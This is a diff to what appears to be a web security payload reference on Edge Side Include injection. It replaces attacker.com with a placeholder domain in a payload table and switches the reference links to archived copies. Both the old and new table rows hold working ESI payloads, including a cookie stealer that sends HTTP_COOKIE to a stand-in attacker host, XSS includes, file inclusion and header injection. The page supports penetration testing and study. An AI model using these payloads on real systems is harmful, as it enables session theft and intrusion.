@@ -48,12 +48,12 @@ Surrogate-Control: content="ESI/1.0"
 
 | Description             | Payload                                  |
 | ----------------------- | ---------------------------------------- |
-| Blind detection         | `<esi:include src=http://attacker.com>`  |
-| XSS                     | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
-| Cookie stealer          | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
+| Blind detection         | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]>`  |
+| XSS                     | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>` |
+| Cookie stealer          | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
 | Include a file          | `<esi:include src="supersecret.txt">` |
 | Display debug info      | `<esi:debug/>` |
-| Add header              | `<!--esi $add_header('Location','http://attacker.com') -->` |
+| Add header              | `<!--esi $add_header('Location','http://[ATTACKER.DOMAIN.TLD]') -->` |
 | Inline fragment         | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |
 
 | Software | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |
@@ -67,9 +67,9 @@ Surrogate-Control: content="ESI/1.0"
 
 ## References
 
-* [Beyond XSS: Edge Side Include Injection - Louis Dion-Marcil - April 3, 2018](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
-* [DEF CON 26 - Edge Side Include Injection Abusing Caching Servers into SSRF - ldionmarcil - October 23, 2018](https://www.youtube.com/watch?v=VUZGZnpSg8I)
-* [ESI Injection Part 2: Abusing specific implementations - Philippe Arteau - May 2, 2019](https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
-* [Exploiting Server Side Include Injection - n00py - August 15, 2017](https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
-* [Server Side Inclusion/Edge Side Inclusion Injection - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)
-* [Server-Side Includes (SSI) Injection - Weilin Zhong, Nsrav - December 4, 2019](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)
+* [Beyond XSS: Edge Side Include Injection - Louis Dion-Marcil - April 3, 2018](https://web.archive.org/web/20190321030437/https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection)
+* [DEF CON 26 - Edge Side Include Injection Abusing Caching Servers into SSRF - ldionmarcil - October 23, 2018](https://web.archive.org/web/20250916100719/https://www.youtube.com/watch?v=VUZGZnpSg8I)
+* [ESI Injection Part 2: Abusing specific implementations - Philippe Arteau - May 2, 2019](https://web.archive.org/web/20260208231729/https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations)
+* [Exploiting Server Side Include Injection - n00py - August 15, 2017](https://web.archive.org/web/20260115183939/https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
+* [Server Side Inclusion/Edge Side Inclusion Injection - HackTricks - July 19, 2024](https://web.archive.org/web/20210615171520/https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)
+* [Server-Side Includes (SSI) Injection - Weilin Zhong, Nsrav - December 4, 2019](https://web.archive.org/web/20220123033237/https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)
